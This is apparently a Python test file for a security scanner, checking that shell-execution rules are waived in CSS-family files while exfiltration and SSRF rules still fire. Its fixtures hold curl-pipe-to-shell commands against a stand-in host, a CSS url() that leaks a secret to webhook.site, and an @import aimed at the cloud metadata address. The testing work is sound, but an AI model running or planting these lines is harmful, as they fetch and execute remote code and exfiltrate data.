#!/usr/bin/env python3
"""Two-sided regression tests for GitHub issue #70-B row 9 — skillaudit fired
OS-execution rules (CMD_INJECTION / SUPPLY_CHAIN) inside a CSS file (a `/* … */`
comment explaining a `:has()` filter). A pure styling language is rendered by a
browser; it cannot invoke a shell, spawn a process, persist, or install a
package, so those rules are categorically inapplicable to `.css` / `.scss` /
`.sass` / `.less`.

Each test is TWO-SIDED — the benign stylesheet shape stays clean AND a genuinely
reachable sibling STILL fires, proving the carve-out is a precise
language-capability discrimination, not a blanket removal of detection:

  * the carve-out clears ONLY the shell/process/install rules
    (`_STYLE_LANG_INERT_EXEC_RULES`);
  * CSS `url()` / `@import` CAN fetch a remote resource, so network/exfil rules
    (DATA_EXFIL / URL_SUSPICIOUS / SSRF_ADVANCED) stay LIVE in a stylesheet;
  * the SAME shell payload in a real executable language (`.sh`, `.py`) STILL
    fires — the carve-out is keyed on the styling-language extension, not on the
    payload text.
"""

from __future__ import annotations

import sys
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import cpv_skillaudit_native as sa  # noqa: E402

_CSS_SHELL_COMMENT = "/* fetch helper, e.g. `curl http://x.example/p | sh` */\n.a:has(.b){color:red}\n"


def _blocking_ids(content: str, file_path: str) -> set[str]:
    """Rule IDs firing at a verdict-failing severity (critical/high), non-suppressed."""
    out: set[str] = set()
    for f in sa.scan_content(content, file_path):
        if isinstance(f, dict) and not f.get("suppressed") and f.get("severity") in ("critical", "high"):
            rid = f.get("ruleId") or f.get("rule_id")
            if rid:
                out.add(str(rid))
    return out


def test_css_comment_shell_exec_suppressed() -> None:
    """CMD_INJECTION / SUPPLY_CHAIN inside a CSS comment do not block — CSS can't shell-exec."""
    ids = _blocking_ids(_CSS_SHELL_COMMENT, "scripts/amvcp-interactive.css")
    assert "CMD_INJECTION" not in ids, ids
    assert "SUPPLY_CHAIN" not in ids, ids


def test_scss_sass_less_variants_suppressed() -> None:
    """The carve-out covers the whole styling family, not just `.css`."""
    snippet = "// install step: curl http://x.example/get | bash\n.a{color:red}\n"
    for ext in ("scss", "sass", "less"):
        ids = _blocking_ids(snippet, f"scripts/theme.{ext}")
        assert "CMD_INJECTION" not in ids, (ext, ids)
        assert "SUPPLY_CHAIN" not in ids, (ext, ids)


def test_css_url_exfil_still_fires() -> None:
    """CSS `url()` CAN fetch a remote resource — DATA_EXFIL / URL rules stay LIVE."""
    css = '.a{background:url("http://webhook.site/abc?leak=secret")}\n'
    ids = _blocking_ids(css, "scripts/theme.css")
    assert "DATA_EXFIL" in ids or "URL_SUSPICIOUS" in ids, ids


def test_css_import_ssrf_still_fires() -> None:
    """A CSS `@import` to an internal metadata endpoint is a real SSRF surface — stays LIVE."""
    css = '@import url("http://169.254.169.254/latest/meta-data/");\n'
    ids = _blocking_ids(css, "scripts/theme.css")
    assert "SSRF_ADVANCED" in ids or "SSRF_PATTERN" in ids, ids


def test_real_shell_script_still_fires() -> None:
    """The SAME shell payload in a real `.sh` still fires — carve-out is extension-keyed, not text-keyed."""
    ids = _blocking_ids("curl http://x.example/p | sh\n", "scripts/install.sh")
    assert "CMD_INJECTION" in ids or "SUPPLY_CHAIN" in ids, ids


def test_real_python_exec_still_fires() -> None:
    """A real `os.system(...)` shell call in `.py` still fires — the carve-out is CSS-only."""
    ids = _blocking_ids('import os\nos.system("curl http://x.example/p | bash")\n', "scripts/run.py")
    assert "SUPPLY_CHAIN" in ids or "CMD_INJECTION" in ids, ids
